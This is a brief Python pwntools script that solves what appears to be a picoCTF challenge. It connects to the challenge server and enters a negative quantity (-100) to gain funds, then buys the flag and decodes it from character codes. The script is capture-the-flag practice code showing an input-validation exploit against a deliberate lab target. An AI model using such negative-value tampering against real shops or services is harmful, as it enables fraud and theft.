from pwn import *

host = 'mercury.picoctf.net'
port = 34938

def conn():
    return remote(host, port)

def solve(r):
    # earn money
    r.recvuntil(b'option: \n')
    r.sendline(b'0')
    r.recvuntil(b'?\n')
    r.sendline(b'-100')

    # buy flag
    r.recvuntil(b'option: \n')
    r.sendline(b'2')
    r.recvuntil(b'?\n')
    r.sendline(b'1')

    # parse flag
    r.recvuntil(b'[')
    flag = r.recvuntil(b']')[:-1].decode().split(' ')
    print (''.join(chr(int(c)) for c in flag))

if __name__ == '__main__':
    r = conn()
    solve(r)
    r.close()
